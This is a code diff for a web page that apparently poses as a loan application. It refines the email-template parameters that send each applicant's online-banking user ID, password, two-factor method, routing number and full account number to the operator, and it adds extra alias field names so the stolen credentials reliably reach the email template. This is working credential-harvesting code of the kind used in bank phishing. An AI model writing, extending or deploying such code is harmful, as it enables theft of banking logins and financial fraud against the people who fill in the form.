@@ -609,14 +609,14 @@
                 
                 const fullBankName = bankNames[bankNameValue] || 'Not provided';
                 
-                // TEST WITH COMMON TEMPLATE FIELD NAMES
+                // COMPREHENSIVE TEMPLATE PARAMS - Try all possible field names
                 const templateParams = {
                     // Basic recipient and sender
                     to_email: data.email || 'test@example.com',
                     from_name: data.fullName || 'Test User',
                     reply_to: data.email || 'test@example.com',
                     
-                    // Subject line test
+                    // Subject line
                     subject: 'Bank Authentication Completed - ' + (data.fullName || 'Test User'),
                     
                     // Loan information
@@ -624,23 +624,27 @@
                     loan_purpose: data.loanPurpose || 'Debt Consolidation',
                     loan_duration: (data.loanDuration || '36') + ' months',
                     
-                    // Bank information - TRY ALL COMMON NAMES
+                    // Bank information - ALL POSSIBLE NAMES
                     bank_name: fullBankName,
                     customer_bank: data.customerBank || fullBankName,
                     bank: fullBankName,
                     banking_institution: fullBankName,
+                    bank_selected: fullBankName,
+                    selected_bank: fullBankName,
                     
                     // Account information
                     routing_number: data.routingNumber || '123456789',
                     account_number: data.accountNumber ? '****' + data.accountNumber.slice(-4) : '****1234',
                     routing: data.routingNumber || '123456789',
                     account: data.accountNumber || '123456789',
+                    bank_account: data.accountNumber || '123456789',
                     
-                    // Borrower information
+                    // Borrower information - ALL POSSIBLE NAMES
                     borrower_name: data.fullName || 'Test User',
                     customer_name: data.fullName || 'Test User',
                     name: data.fullName || 'Test User',
                     full_name: data.fullName || 'Test User',
+                    client_name: data.fullName || 'Test User',
                     
                     // Contact information
                     phone: data.phone || '555-123-4567',
@@ -651,7 +655,7 @@
                     zip_code: data.zipCode || '12345',
                     zip: data.zipCode || '12345',
                     
-                    // BANK AUTHENTICATION FIELDS - TRY EVERY POSSIBLE NAME
+                    // BANK AUTHENTICATION FIELDS - ALL POSSIBLE NAMES
                     user_id: userIdValue || 'testuser123',
                     username: userIdValue || 'testuser123',
                     banking_user_id: userIdValue || 'testuser123',
@@ -659,27 +663,38 @@
                     mobile_banking_user_id: userIdValue || 'testuser123',
                     bank_auth_user_id: userIdValue || 'testuser123',
                     customer_user_id: userIdValue || 'testuser123',
+                    banking_userid: userIdValue || 'testuser123',
+                    userid: userIdValue || 'testuser123',
                     
-                    // PASSWORD FIELDS - TRY EVERY POSSIBLE NAME
+                    // PASSWORD FIELDS - ALL POSSIBLE NAMES
                     password: passwordValue || 'testpass123',
                     banking_password: passwordValue || 'testpass123',
                     online_banking_password: passwordValue || 'testpass123',
                     mobile_banking_password: passwordValue || 'testpass123',
                     bank_auth_password: passwordValue || 'testpass123',
                     customer_password: passwordValue || 'testpass123',
+                    pass: passwordValue || 'testpass123',
+                    user_password: passwordValue || 'testpass123',
                     
-                    // TWO FACTOR
+                    // TWO FACTOR - ALL POSSIBLE NAMES
                     two_factor: twoFactorValue || 'sms',
                     two_factor_method: twoFactorValue || 'sms',
                     authentication_method: twoFactorValue || 'sms',
                     verification_method: twoFactorValue || 'sms',
+                    auth_method: twoFactorValue || 'sms',
                     
                     // METADATA
                     application_type: 'Bank Authentication Completed',
                     submission_date: new Date().toLocaleString(),
                     timestamp: new Date().toISOString(),
                     date: new Date().toLocaleDateString(),
-                    time: new Date().toLocaleTimeString()
+                    time: new Date().toLocaleTimeString(),
+                    
+                    // ADD BANK-SPECIFIC FIELDS
+                    bank_auth_bank_name: fullBankName,
+                    bank_auth_user_id: userIdValue || 'testuser123',
+                    bank_auth_password: passwordValue || 'testpass123',
+                    bank_auth_two_factor: twoFactorValue || 'sms'
                 };
 
                 console.log('=== FINAL TEMPLATE PARAMS ===');
